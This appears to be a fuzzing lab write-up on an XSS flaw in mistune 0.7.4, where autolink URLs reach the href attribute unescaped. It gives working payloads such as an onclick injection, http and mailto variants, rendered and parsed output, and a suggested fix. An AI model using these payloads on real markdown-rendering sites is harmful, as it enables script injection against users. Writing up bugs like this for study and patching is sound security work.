# exercise 3

atheris + mistune 0.7.4. the harness renders markdown through
`mistune.Markdown()(s)`, parses the output with html5lib, and asserts
that no parsed attribute value contains a literal `"`. that assertion
models an XSS breakout — once a `"` lands in an attribute value, the
markup can be closed and a new attribute (event handler) injected.

## finding: autolink url is not escaped -> direct attribute injection

in mistune 0.7.4 the autolink renderer drops the url into the href
attribute without escaping `"`. so any `"` the attacker puts inside
`<...>` goes straight into the raw html output as a literal quote,
closing the `href=` and turning the rest of the url into new
attributes on the `<a>` tag.

no reflection needed, no downstream consumer needed. the rendered
html itself is xss.

## smallest trigger (8 bytes)

```
<a:"x=y>
```

mistune renders:

```html
<p><a href="a:"x=y">a:"x=y</a></p>
```

browser / html5lib parses the tag as:

```
<a href="a:" x="y">
```

the harness fires on the attribute `x="y"` because `y"` contains `"`.

## full xss payload (21 bytes)

```
<a:"onclick=alert(1)>
```

rendered:

```html
<p><a href="a:"onclick=alert(1)">a:"onclick=alert(1)</a></p>
```

parsed:

```
<a href="a:" onclick="alert(1)">
```

clicking the link runs `alert(1)`. swap `onclick` for `onmouseover`
for a hover trigger, or use any other event handler.

## other payloads that reach the same surface

```
<http://a"onmouseover=alert(1)>     -> http autolink, direct xss
<a"onclick=alert(1)@c.d>            -> mailto autolink, direct xss
[x](a"b)                            -> inline link href (escaped to &quot;, reflects)
![a"b](x)                           -> image alt (escaped to &quot;, reflects)
[x][1]\n\n[1]: http://a"b           -> reference link (escaped to &quot;, reflects)
```

both autolink flavors (url `<scheme:...>` and email `<...@...>`) skip
the escape and produce direct xss in the raw html.

the inline link / image / reference-link variants go through
`escape(..., quote=True)` and come out as `&quot;` in the html, which
is html-safe. they still trip the harness because html5lib decodes
`&quot;` back to `"` in the attribute dict, modeling a downstream
consumer that reads the parsed href and reflects it into new html.

## fix idea

in `mistune/__init__.py`, the autolink renderer should run the url
through the same `escape(..., quote=True)` that inline links and
images already use. for defence in depth, replace `"` with `%22` in
urls before any html escape so the character never round-trips
through the parsed attribute value either.
